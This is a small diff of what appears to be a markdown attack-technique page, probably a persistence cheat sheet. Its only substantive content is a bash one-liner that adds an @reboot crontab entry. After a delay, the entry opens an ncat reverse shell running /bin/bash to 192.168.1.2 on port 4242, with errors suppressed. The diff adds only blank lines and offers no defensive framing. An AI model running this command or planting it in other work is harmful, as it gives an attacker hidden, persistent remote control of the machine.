@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:34:18.598510+00:00'
 ```bash
 (crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
 ```
+
+
